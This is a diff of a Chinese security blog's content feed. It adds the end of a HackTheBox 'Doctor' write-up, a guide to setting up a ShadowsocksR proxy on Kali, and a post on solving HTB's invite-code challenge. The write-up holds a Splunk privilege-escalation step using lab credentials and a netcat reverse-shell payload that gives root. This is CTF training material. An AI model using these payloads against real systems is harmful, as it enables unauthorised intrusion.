+<h2 id="0x05-提权"><a href="#0x05-提权" class="headerlink" title="0x05.提权"></a>0x05.提权</h2><h3 id="1-shaun没有权限"><a href="#1-shaun没有权限" class="headerlink" title="1.shaun没有权限"></a>1.shaun没有权限</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">shaun@doctor:/home/web$ sudo -l</span><br><span class="line">[sudo] password for shaun: </span><br><span class="line">Sorry, user shaun may not run sudo on doctor.</span><br><span class="line">shaun@doctor:/home/web$</span><br></pre></td></tr></table></figure>
+
+<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC8xY2VhOTViYjM1OGM=">什么是splunk<i class="fa fa-external-link-alt"></i></span></p>
+<h3 id="2-利用splunk提权地址"><a href="#2-利用splunk提权地址" class="headerlink" title="2.利用splunk提权地址"></a>2.利用splunk提权<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2Nub3Rpbi9TcGx1bmtXaGlzcGVyZXIyLmdpdA==">地址<i class="fa fa-external-link-alt"></i></span></h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/htb/doctor# git clone https://github.com/cnotin/SplunkWhisperer2</span><br><span class="line">正克隆到 &#x27;SplunkWhisperer2&#x27;...</span><br><span class="line">remote: Enumerating objects: 7, done.</span><br><span class="line">remote: Counting objects: 100% (7/7), done.</span><br><span class="line">remote: Compressing objects: 100% (6/6), done.</span><br><span class="line">remote: Total 55 (delta 1), reused 2 (delta 1), pack-reused 48</span><br><span class="line">展开对象中: 100% (55/55), 20.68 KiB | 162.00 KiB/s, 完成.</span><br><span class="line"></span><br><span class="line">root@JIYE:~/htb/doctor# ls</span><br><span class="line">nmap.CVT  SplunkWhisperer2  user</span><br><span class="line"></span><br><span class="line">root@JIYE:~/htb/doctor# cd SplunkWhisperer2/</span><br><span class="line"></span><br><span class="line">root@JIYE:~/htb/doctor/SplunkWhisperer2# ls</span><br><span class="line">LICENSE  PySplunkWhisperer2  README.md  SharpSplunkWhisperer2</span><br><span class="line"></span><br><span class="line">root@JIYE:~/htb/doctor/SplunkWhisperer2# cd PySplunkWhisperer2/</span><br><span class="line"></span><br><span class="line">root@JIYE:~/htb/doctor/SplunkWhisperer2/PySplunkWhisperer2# ls</span><br><span class="line">build_exe.bat  PySplunkWhisperer2_local.py  PySplunkWhisperer2_remote.py  README.md  requirements.txt</span><br><span class="line"></span><br><span class="line">root@JIYE:~/htb/doctor/SplunkWhisperer2/PySplunkWhisperer2# proxychains pip2 install -r requirements.txt </span><br><span class="line">ProxyChains-3.1 (http://proxychains.sf.net)</span><br><span class="line">|DNS-request| ::1 </span><br><span class="line">|S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-4.2.2.2:53-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|DNS-response|: ::1 does not exist</span><br><span class="line">DEPRECATION: Python 2.7 reached the end of its life on January 1st, 2020. Please upgrade your Python as Python 2.7 is no longer maintained. pip 21.0 will drop support for Python 2.7 in January 2021. More details about Python 2 support in pip can be found at https://pip.pypa.io/en/latest/development/release-process/#python-2-support</span><br><span class="line">Requirement already satisfied: requests in /usr/lib/python2.7/dist-packages (from -r requirements.txt (line 1)) (2.22.0)</span><br><span class="line">|DNS-request| pypi.org </span><br><span class="line">|S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-4.2.2.2:53-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|DNS-response| pypi.org is 151.101.64.223</span><br><span class="line">|S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-151.101.64.223:443-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">WARNING: You are using pip version 20.2.2; however, version 20.2.4 is available.</span><br><span class="line">You should consider upgrading via the &#x27;/usr/bin/python2 -m pip install --upgrade pip&#x27; command.</span><br><span class="line">root@JIYE:~/htb/doctor/SplunkWhisperer2/PySplunkWhisperer2# ls</span><br><span class="line">build_exe.bat  PySplunkWhisperer2_local.py  PySplunkWhisperer2_remote.py  README.md  requirements.txt</span><br><span class="line"></span><br><span class="line">root@JIYE:~/htb/doctor/SplunkWhisperer2/PySplunkWhisperer2# chmod +x PySplunkWhisperer2_remote.py </span><br><span class="line">root@JIYE:~/htb/doctor/SplunkWhisperer2/PySplunkWhisperer2#</span><br></pre></td></tr></table></figure>
+
+<p><code>查看使用方法</code><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2Nub3Rpbi9TcGx1bmtXaGlzcGVyZXIyL2Jsb2IvbWFzdGVyL1B5U3BsdW5rV2hpc3BlcmVyMi9SRUFETUUubWQ=">readme<i class="fa fa-external-link-alt"></i></span></p>
+<h3 id="3-kali先监听8888"><a href="#3-kali先监听8888" class="headerlink" title="3.kali先监听8888"></a>3.kali先监听8888</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@JIYE:~# nc -nvlp 8888</span><br><span class="line">listening on [any] 8888 ...</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="4-执行"><a href="#4-执行" class="headerlink" title="4.执行"></a>4.执行</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/htb/doctor/SplunkWhisperer2/PySplunkWhisperer2# python3 PySplunkWhisperer2_remote.py --host 10.10.10.209 --lhost 10.10.17.216 --username shaun --password Guitar123 --payload &#x27;nc.traditional -e/bin/bash &#x27;10.10.17.216&#x27; &#x27;8888&#x27;&#x27;</span><br><span class="line">Running in remote mode (Remote Code Execution)</span><br><span class="line">[.] Authenticating...</span><br><span class="line">[+] Authenticated</span><br><span class="line">[.] Creating malicious app bundle...</span><br><span class="line">[+] Created malicious app bundle in: /tmp/tmpo7c3zpu6.tar</span><br><span class="line">[+] Started HTTP server for remote mode</span><br><span class="line">[.] Installing app from: http://10.10.17.216:8181/</span><br><span class="line">10.10.10.209 - - [18/Oct/2020 04:50:53] &quot;GET / HTTP/1.1&quot; 200 -</span><br><span class="line">[+] App installed, your code should be running now!</span><br><span class="line"></span><br><span class="line">Press RETURN to cleanup</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="5-得到shell"><a href="#5-得到shell" class="headerlink" title="5.得到shell"></a>5.得到shell</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@JIYE:~# nc -nvlp 8888</span><br><span class="line">listening on [any] 8888 ...</span><br><span class="line">connect to [10.10.17.216] from (UNKNOWN) [10.10.10.209] 49402</span><br><span class="line">whoami</span><br><span class="line">root</span><br><span class="line"></span><br><span class="line">pwd</span><br><span class="line">/</span><br><span class="line"></span><br><span class="line">python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line">root@doctor:/# cd</span><br><span class="line">cd</span><br><span class="line">bash: cd: HOME not set</span><br><span class="line">root@doctor:/# ls</span><br><span class="line">ls</span><br><span class="line">bin    dev   lib    libx32      mnt   root  snap      sys  var</span><br><span class="line">boot   etc   lib32  lost+found  opt   run   srv       tmp</span><br><span class="line">cdrom  home  lib64  media       proc  sbin  swapfile  usr</span><br><span class="line">root@doctor:/# ^Z       </span><br><span class="line">[1]+  已停止               nc -nvlp 8888</span><br><span class="line">root@JIYE:~# stty raw -echo</span><br><span class="line">root@JIYE:~# nc -nvlp 8888</span><br><span class="line"></span><br><span class="line">root@doctor:/# </span><br><span class="line">root@doctor:/# </span><br><span class="line">root@doctor:/# cd /root/</span><br><span class="line">root@doctor:/root# ls</span><br><span class="line">root.txt</span><br><span class="line">root@doctor:/root# cat root.txt </span><br><span class="line">***********************************</span><br><span class="line">root@doctor:/root#</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>HackTheBox</category>
+      </categories>
+      <tags>
+        <tag>靶机</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>kali设置酸酸乳</title>
+    <url>/2020/08/16/kali%E8%AE%BE%E7%BD%AE%E4%BB%A3%E7%90%86/</url>
+    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote>
+<p>由于经常需要在vm中使用kali，并且要大量下载国外资源，所以没有一个滋润的代理<br>是不能忍受的！你要佛系当我没说。。。下面来解决一下这个问题</p>
+</blockquote>
+<a id="more"></a>
+
+<h2 id="浏览器代理"><a href="#浏览器代理" class="headerlink" title="浏览器代理"></a>浏览器代理</h2><h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a><strong>准备工作</strong></h3><blockquote>
+<p>有可用的SSR账号，可以选择网上免费分享的账号，或者自己在VPS上搭建。</p>
+<p>虚拟机网卡模式为桥接</p>
+</blockquote>
+<h3 id="下载SSR脚本并安装"><a href="#下载SSR脚本并安装" class="headerlink" title="下载SSR脚本并安装"></a><strong>下载SSR脚本并安装</strong></h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://lunamoore.github.io/ssr</span><br><span class="line">mv ssr /usr/<span class="built_in">local</span>/bin</span><br><span class="line">chmod 766 /usr/<span class="built_in">local</span>/bin/ssr</span><br><span class="line">ssr install</span><br><span class="line">ssr config</span><br></pre></td></tr></table></figure>
+
+<h3 id="配置SSR"><a href="#配置SSR" class="headerlink" title="配置SSR"></a><strong>配置SSR</strong></h3><p>一般情况只需要修改以下有注释的地方</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">        <span class="string">&quot;server&quot;</span>: <span class="string">&quot;0.0.0.0&quot;</span>,   //服务器IP地址</span><br><span class="line">        <span class="string">&quot;server_ipv6&quot;</span>: <span class="string">&quot;::&quot;</span>,</span><br><span class="line">        <span class="string">&quot;server_port&quot;</span>: 2333,  //端口</span><br><span class="line">        <span class="string">&quot;local_address&quot;</span>: <span class="string">&quot;127.0.0.1&quot;</span>, </span><br><span class="line">        <span class="string">&quot;local_port&quot;</span>: 1080,</span><br><span class="line"></span><br><span class="line">        <span class="string">&quot;password&quot;</span>: <span class="string">&quot;password&quot;</span>,  //密码</span><br><span class="line">        <span class="string">&quot;method&quot;</span>: <span class="string">&quot;aes-256-cfb&quot;</span>, //加密方式</span><br><span class="line">        <span class="string">&quot;protocol&quot;</span>: <span class="string">&quot;auth_aes128_md5&quot;</span>, //协议</span><br><span class="line">        <span class="string">&quot;protocol_param&quot;</span>: <span class="string">&quot;&quot;</span>,  //协议参数</span><br><span class="line">        <span class="string">&quot;obfs&quot;</span>: <span class="string">&quot;plain&quot;</span>,  //混淆</span><br><span class="line">        <span class="string">&quot;obfs_param&quot;</span>: <span class="string">&quot;&quot;</span>,  //混淆参数</span><br><span class="line">        <span class="string">&quot;speed_limit_per_con&quot;</span>: 0,</span><br><span class="line">        <span class="string">&quot;speed_limit_per_user&quot;</span>: 0,</span><br><span class="line"></span><br><span class="line">        <span class="string">&quot;additional_ports&quot;</span> : &#123;&#125;, </span><br><span class="line">        <span class="string">&quot;additional_ports_only&quot;</span> : <span class="literal">false</span>, </span><br><span class="line">        <span class="string">&quot;timeout&quot;</span>: 120,</span><br><span class="line">        <span class="string">&quot;udp_timeout&quot;</span>: 60,</span><br><span class="line">        <span class="string">&quot;dns_ipv6&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="string">&quot;connect_verbose_info&quot;</span>: 0,</span><br><span class="line">        <span class="string">&quot;redirect&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;fast_open&quot;</span>: <span class="literal">false</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="配置代理"><a href="#配置代理" class="headerlink" title="配置代理"></a><strong>配置代理</strong></h3><ul>
+<li>以Firefox为例，Chrome上设置类似。</li>
+<li>在应用商店找到插件 <code>Proxy SwitchyOmega</code>，添加至Chrome</li>
+<li>点击 图标 &gt;&gt; 选项 &gt;&gt; (左边)新建情景模式 ,选第一项 <code>代理服务器</code></li>
+</ul>
+<img src="/2020/08/16/kali%E8%AE%BE%E7%BD%AE%E4%BB%A3%E7%90%86/image-20200814192051948.png" class>
+
+<h3 id="设置开机启动"><a href="#设置开机启动" class="headerlink" title="设置开机启动"></a><strong>设置开机启动</strong></h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /etc/init.d</span><br><span class="line">touch ssr</span><br><span class="line">chmod +x ssr</span><br><span class="line">vim ssr</span><br></pre></td></tr></table></figure>
+
+<p>其中ssr的内容为</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### BEGIN INIT INFO</span></span><br><span class="line"><span class="comment"># Provides: ssr    // 程序名，唯一。</span></span><br><span class="line"><span class="comment"># Required-Start: $network $remote_fs $local_fs</span></span><br><span class="line"><span class="comment"># Required-Stop: $network $remote_fs $local_fs</span></span><br><span class="line"><span class="comment"># Default-Start: 2 3 4 5</span></span><br><span class="line"><span class="comment"># Default-Stop: 0 1 6</span></span><br><span class="line"><span class="comment"># Short-Description: ssr    // 启动项的简短说明，随心写。</span></span><br><span class="line"><span class="comment"># Description: shadowsocksR    // 启动项的完整说明，随心写。</span></span><br><span class="line"><span class="comment">### END INIT INFO</span></span><br><span class="line"></span><br><span class="line">nohup ssr start &gt;/dev/null 2&gt;&amp;1 &amp; </span><br><span class="line"></span><br><span class="line"><span class="built_in">exit</span> 0</span><br></pre></td></tr></table></figure>
+
+<p>设置为开机自启</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">update-rc.d ssr defaults</span><br></pre></td></tr></table></figure>
+
+<p>删除开机启动</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">update-rc.d -f ssr remove</span><br></pre></td></tr></table></figure>
+
+<p>开机手动开启或关闭</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssr start</span><br><span class="line">ssr stop</span><br><span class="line">ssr uninstall  //卸载</span><br></pre></td></tr></table></figure>
+
+<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a><strong>测试</strong></h3><img src="/2020/08/16/kali%E8%AE%BE%E7%BD%AE%E4%BB%A3%E7%90%86/image-20200814193445301.png" class>
+
+
+<h2 id="终端命令行代理"><a href="#终端命令行代理" class="headerlink" title="终端命令行代理"></a>终端命令行代理</h2><h3 id="使用proxychains"><a href="#使用proxychains" class="headerlink" title="使用proxychains"></a>使用proxychains</h3><p><code>proxychains</code>终端命令行代理神器，科学上网，内网穿透渗透必备</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/proxychains.conf</span><br></pre></td></tr></table></figure>
+
+<p>编辑配置文件，某尾修改自己的socks5本地代理地址很端口。</p>
+<img src="/2020/08/16/kali%E8%AE%BE%E7%BD%AE%E4%BB%A3%E7%90%86/image-20200814195018483.png" class>
+
+<h3 id="测试-1"><a href="#测试-1" class="headerlink" title="测试"></a>测试</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">proxychains curl https://www.google.com</span><br></pre></td></tr></table></figure>
+
+<img src="/2020/08/16/kali%E8%AE%BE%E7%BD%AE%E4%BB%A3%E7%90%86/image-20200814195221075.png" class>
+
+<h3 id="使用privoxy"><a href="#使用privoxy" class="headerlink" title="使用privoxy"></a>使用privoxy</h3><p>使用Privoxy实现，此方法只有临时生效</p>
+<p>首先安装privoxy</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt install -y privoxy</span><br></pre></td></tr></table></figure>
+
+<p>本次使用全局模式。全局模式，将所有http/https请求走代理服务。</p>
+<p>1.添加本地ssr服务到配置文件</p>
+<blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;forward-socks5 / 127.0.0.1:1080 .&#x27;</span> &gt;&gt; /etc/privoxy/config</span><br></pre></td></tr></table></figure>
+
+<p>2.Privoxy 默认监听端口是是8118，每次使用都需要添加如下命令</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> http_proxy=http://127.0.0.1:8118</span><br><span class="line"><span class="built_in">export</span> https_proxy=http://127.0.0.1:8118</span><br><span class="line"><span class="built_in">export</span> no_proxy=localhost</span><br></pre></td></tr></table></figure>
+
+<p>3.启动服务</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl start privoxy.service</span><br><span class="line">systemctl <span class="built_in">enable</span> privoxy.service</span><br></pre></td></tr></table></figure>
+
+<p>no_proxy是不经过privoxy代理的地址<br>只能填写具体的ip、域名后缀，多个条目之间使用’,’逗号隔开<br>比如: export no_proxy=”localhost, 192.168.1.1, ip.cn, chinaz.com”<br>访问 localhost、192.168.1.1、ip.cn、*.ip.cn、chinaz.com、*.chinaz.com 将不使用代理</p>
+</blockquote>
+<p>查看出口配置</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span></span><br></pre></td></tr></table></figure>
+
+<img src="/2020/08/16/kali%E8%AE%BE%E7%BD%AE%E4%BB%A3%E7%90%86/image-20200815140327118.png" class>
+
+<h3 id="测试-2"><a href="#测试-2" class="headerlink" title="测试"></a>测试</h3><p>出现网页源码则为成功</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -sL facebook.com</span><br><span class="line">curl -sL www.baidu.com</span><br><span class="line">curl -sL www.google.com</span><br></pre></td></tr></table></figure>
+
+<img src="/2020/08/16/kali%E8%AE%BE%E7%BD%AE%E4%BB%A3%E7%90%86/image-20200815140200323.png" class>
+
+
+
+]]></content>
+      <categories>
+        <category>kali</category>
+      </categories>
+      <tags>
+        <tag>linux</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>HackTheBox注册</title>
+    <url>/2020/08/19/hackthebox%E6%B3%A8%E5%86%8C/</url>
+    <content><![CDATA[<h2 id="0x00-前言-什么是Hack-The-Box"><a href="#0x00-前言-什么是Hack-The-Box" class="headerlink" title="0x00.前言~什么是Hack The Box"></a>0x00.前言~什么是Hack The Box</h2><blockquote>
+<p>它基本上是一个在线平台，用于测试和增强你的渗透测试和网络安全技能。它包含一些不断更新的挑战。其中一些模拟了现实世界的场景，而另一些则更倾向于CTF的挑战风格。如果你对网络安全或信息安全感兴趣，则应尝试此站点。OK让我们开始吧！！！</p>
+</blockquote>
+<a id="more"></a>
+
+<h2 id="0x01-首先，访问Hack-the-Box网站，并阅读其常见问题解答和一些其他有用的东西。"><a href="#0x01-首先，访问Hack-the-Box网站，并阅读其常见问题解答和一些其他有用的东西。" class="headerlink" title="0x01.首先，访问Hack the Box网站，并阅读其常见问题解答和一些其他有用的东西。"></a>0x01.首先，访问<span class="exturl" data-url="aHR0cHM6Ly93d3cuaGFja3RoZWJveC5ldS8=">Hack the Box网站，<i class="fa fa-external-link-alt"></i></span>并阅读其常见问题解答和一些其他有用的东西。</h2><h2 id="0x02-系统将提示您转到https-www-hackthebox-eu-邀请加入HTB。"><a href="#0x02-系统将提示您转到https-www-hackthebox-eu-邀请加入HTB。" class="headerlink" title="0x02.系统将提示您转到https://www.hackthebox.eu/邀请加入HTB。"></a>0x02.系统将提示您转到<span class="exturl" data-url="aHR0cHM6Ly93d3cuaGFja3RoZWJveC5ldS9pbnZpdGU=">https://www.hackthebox.eu/<i class="fa fa-external-link-alt"></i></span>邀请加入HTB。</h2><h2 id="0x03-当您转到该页面时，将看到一个文本框，让你输入邀请码。"><a href="#0x03-当您转到该页面时，将看到一个文本框，让你输入邀请码。" class="headerlink" title="0x03.当您转到该页面时，将看到一个文本框，让你输入邀请码。"></a>0x03.当您转到该页面时，将看到一个文本框，让你输入<em>邀请码</em>。</h2><h3 id="01-根据提示打开控制台"><a href="#01-根据提示打开控制台" class="headerlink" title="01.根据提示打开控制台"></a>01.根据提示打开控制台</h3><img src="/2020/08/19/hackthebox%E6%B3%A8%E5%86%8C/image-20200819155151668.png" class>
+
+<h3 id="02-根据提示继续"><a href="#02-根据提示继续" class="headerlink" title="02.根据提示继续"></a>02.根据提示继续</h3><p><code>挑战第一步，此页面加载一个有趣的javascript文件。看看你能不能找到它：</code></p>
+<img src="/2020/08/19/hackthebox%E6%B3%A8%E5%86%8C/image-20200819155456002.png" class>
+
+<h3 id="03-发现邀请接口的js文件"><a href="#03-发现邀请接口的js文件" class="headerlink" title="03.发现邀请接口的js文件"></a>03.发现邀请接口的js文件</h3><img src="/2020/08/19/hackthebox%E6%B3%A8%E5%86%8C/image-20200819155754688.png" class>
+
+<h3 id="04-右键打开，发现制造邀请码函数"><a href="#04-右键打开，发现制造邀请码函数" class="headerlink" title="04.右键打开，发现制造邀请码函数"></a>04.右键打开，发现制造邀请码函数</h3><img src="/2020/08/19/hackthebox%E6%B3%A8%E5%86%8C/image-20200819155903977.png" class>
+
+<h3 id="05-在控制台调用"><a href="#05-在控制台调用" class="headerlink" title="05.在控制台调用"></a>05.在控制台调用</h3><p><code>可以看到200状态码，可以看到data为加密为ROT13(有时也为base64)</code></p>
+<img src="/2020/08/19/hackthebox%E6%B3%A8%E5%86%8C/image-20200819160416212.png" class>
+
+<h3 id="06-解密"><a href="#06-解密" class="headerlink" title="06.解密"></a>06.解密</h3><p><code>发现要发送POST请求</code></p>
+<img src="/2020/08/19/hackthebox%E6%B3%A8%E5%86%8C/image-20200819160919218.png" class>
+
+<h3 id="07-发送POST请求"><a href="#07-发送POST请求" class="headerlink" title="07.发送POST请求"></a>07.发送POST请求</h3><p><code>得到以=结尾的数据，猜测为base64</code></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">SlpYQkMtRkVBWUktWkhWQ1AtRkhTU0gtS0xEVFQ=</span><br></pre></td></tr></table></figure>
+
+<img src="/2020/08/19/hackthebox%E6%B3%A8%E5%86%8C/image-20200819161940343.png" class>
+
+<h3 id="08-解码"><a href="#08-解码" class="headerlink" title="08.解码"></a>08.解码</h3><p><code>得到邀请码</code></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">JZXBC-FEAYI-ZHVCP-FHSSH-KLDTT</span><br></pre></td></tr></table></figure>
+
+<img src="/2020/08/19/hackthebox%E6%B3%A8%E5%86%8C/image-20200819162456042.png" class>
+
+<h3 id="09-之后就可以愉快的玩耍了"><a href="#09-之后就可以愉快的玩耍了" class="headerlink" title="09.之后就可以愉快的玩耍了"></a>09.之后就可以愉快的玩耍了</h3><p><code>根据提示进行连接即可</code></p>
+<img src="/2020/08/19/hackthebox%E6%B3%A8%E5%86%8C/image-20200819195715615.png" class>
+
+<p><code>下图为连接成功状态</code></p>
+<img src="/2020/08/19/hackthebox%E6%B3%A8%E5%86%8C/image-20200819195817627.png" class>
 ]]></content>
       <categories>
         <category>HackTheBox</category>
@@ -371,140 +567,6 @@
       </categories>
       <tags>
         <tag>靶机</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>HackTheBox注册</title>
-    <url>/2020/08/19/hackthebox%E6%B3%A8%E5%86%8C/</url>
-    <content><![CDATA[<h2 id="0x00-前言-什么是Hack-The-Box"><a href="#0x00-前言-什么是Hack-The-Box" class="headerlink" title="0x00.前言~什么是Hack The Box"></a>0x00.前言~什么是Hack The Box</h2><blockquote>
-<p>它基本上是一个在线平台，用于测试和增强你的渗透测试和网络安全技能。它包含一些不断更新的挑战。其中一些模拟了现实世界的场景，而另一些则更倾向于CTF的挑战风格。如果你对网络安全或信息安全感兴趣，则应尝试此站点。OK让我们开始吧！！！</p>
-</blockquote>
-<a id="more"></a>
-
-<h2 id="0x01-首先，访问Hack-the-Box网站，并阅读其常见问题解答和一些其他有用的东西。"><a href="#0x01-首先，访问Hack-the-Box网站，并阅读其常见问题解答和一些其他有用的东西。" class="headerlink" title="0x01.首先，访问Hack the Box网站，并阅读其常见问题解答和一些其他有用的东西。"></a>0x01.首先，访问<span class="exturl" data-url="aHR0cHM6Ly93d3cuaGFja3RoZWJveC5ldS8=">Hack the Box网站，<i class="fa fa-external-link-alt"></i></span>并阅读其常见问题解答和一些其他有用的东西。</h2><h2 id="0x02-系统将提示您转到https-www-hackthebox-eu-邀请加入HTB。"><a href="#0x02-系统将提示您转到https-www-hackthebox-eu-邀请加入HTB。" class="headerlink" title="0x02.系统将提示您转到https://www.hackthebox.eu/邀请加入HTB。"></a>0x02.系统将提示您转到<span class="exturl" data-url="aHR0cHM6Ly93d3cuaGFja3RoZWJveC5ldS9pbnZpdGU=">https://www.hackthebox.eu/<i class="fa fa-external-link-alt"></i></span>邀请加入HTB。</h2><h2 id="0x03-当您转到该页面时，将看到一个文本框，让你输入邀请码。"><a href="#0x03-当您转到该页面时，将看到一个文本框，让你输入邀请码。" class="headerlink" title="0x03.当您转到该页面时，将看到一个文本框，让你输入邀请码。"></a>0x03.当您转到该页面时，将看到一个文本框，让你输入<em>邀请码</em>。</h2><h3 id="01-根据提示打开控制台"><a href="#01-根据提示打开控制台" class="headerlink" title="01.根据提示打开控制台"></a>01.根据提示打开控制台</h3><img src="/2020/08/19/hackthebox%E6%B3%A8%E5%86%8C/image-20200819155151668.png" class>
-
-<h3 id="02-根据提示继续"><a href="#02-根据提示继续" class="headerlink" title="02.根据提示继续"></a>02.根据提示继续</h3><p><code>挑战第一步，此页面加载一个有趣的javascript文件。看看你能不能找到它：</code></p>
-<img src="/2020/08/19/hackthebox%E6%B3%A8%E5%86%8C/image-20200819155456002.png" class>
-
-<h3 id="03-发现邀请接口的js文件"><a href="#03-发现邀请接口的js文件" class="headerlink" title="03.发现邀请接口的js文件"></a>03.发现邀请接口的js文件</h3><img src="/2020/08/19/hackthebox%E6%B3%A8%E5%86%8C/image-20200819155754688.png" class>
-
-<h3 id="04-右键打开，发现制造邀请码函数"><a href="#04-右键打开，发现制造邀请码函数" class="headerlink" title="04.右键打开，发现制造邀请码函数"></a>04.右键打开，发现制造邀请码函数</h3><img src="/2020/08/19/hackthebox%E6%B3%A8%E5%86%8C/image-20200819155903977.png" class>
-
-<h3 id="05-在控制台调用"><a href="#05-在控制台调用" class="headerlink" title="05.在控制台调用"></a>05.在控制台调用</h3><p><code>可以看到200状态码，可以看到data为加密为ROT13(有时也为base64)</code></p>
-<img src="/2020/08/19/hackthebox%E6%B3%A8%E5%86%8C/image-20200819160416212.png" class>
-
-<h3 id="06-解密"><a href="#06-解密" class="headerlink" title="06.解密"></a>06.解密</h3><p><code>发现要发送POST请求</code></p>
-<img src="/2020/08/19/hackthebox%E6%B3%A8%E5%86%8C/image-20200819160919218.png" class>
-
-<h3 id="07-发送POST请求"><a href="#07-发送POST请求" class="headerlink" title="07.发送POST请求"></a>07.发送POST请求</h3><p><code>得到以=结尾的数据，猜测为base64</code></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">SlpYQkMtRkVBWUktWkhWQ1AtRkhTU0gtS0xEVFQ=</span><br></pre></td></tr></table></figure>
-
-<img src="/2020/08/19/hackthebox%E6%B3%A8%E5%86%8C/image-20200819161940343.png" class>
-
-<h3 id="08-解码"><a href="#08-解码" class="headerlink" title="08.解码"></a>08.解码</h3><p><code>得到邀请码</code></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">JZXBC-FEAYI-ZHVCP-FHSSH-KLDTT</span><br></pre></td></tr></table></figure>
-
-<img src="/2020/08/19/hackthebox%E6%B3%A8%E5%86%8C/image-20200819162456042.png" class>
-
-<h3 id="09-之后就可以愉快的玩耍了"><a href="#09-之后就可以愉快的玩耍了" class="headerlink" title="09.之后就可以愉快的玩耍了"></a>09.之后就可以愉快的玩耍了</h3><p><code>根据提示进行连接即可</code></p>
-<img src="/2020/08/19/hackthebox%E6%B3%A8%E5%86%8C/image-20200819195715615.png" class>
-
-<p><code>下图为连接成功状态</code></p>
-<img src="/2020/08/19/hackthebox%E6%B3%A8%E5%86%8C/image-20200819195817627.png" class>
-]]></content>
-      <categories>
-        <category>HackTheBox</category>
-      </categories>
-      <tags>
-        <tag>靶机</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>kali设置酸酸乳</title>
-    <url>/2020/08/16/kali%E8%AE%BE%E7%BD%AE%E4%BB%A3%E7%90%86/</url>
-    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote>
-<p>由于经常需要在vm中使用kali，并且要大量下载国外资源，所以没有一个滋润的代理<br>是不能忍受的！你要佛系当我没说。。。下面来解决一下这个问题</p>
-</blockquote>
-<a id="more"></a>
-
-<h2 id="浏览器代理"><a href="#浏览器代理" class="headerlink" title="浏览器代理"></a>浏览器代理</h2><h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a><strong>准备工作</strong></h3><blockquote>
-<p>有可用的SSR账号，可以选择网上免费分享的账号，或者自己在VPS上搭建。</p>
-<p>虚拟机网卡模式为桥接</p>
-</blockquote>
-<h3 id="下载SSR脚本并安装"><a href="#下载SSR脚本并安装" class="headerlink" title="下载SSR脚本并安装"></a><strong>下载SSR脚本并安装</strong></h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://lunamoore.github.io/ssr</span><br><span class="line">mv ssr /usr/<span class="built_in">local</span>/bin</span><br><span class="line">chmod 766 /usr/<span class="built_in">local</span>/bin/ssr</span><br><span class="line">ssr install</span><br><span class="line">ssr config</span><br></pre></td></tr></table></figure>
-
-<h3 id="配置SSR"><a href="#配置SSR" class="headerlink" title="配置SSR"></a><strong>配置SSR</strong></h3><p>一般情况只需要修改以下有注释的地方</p>
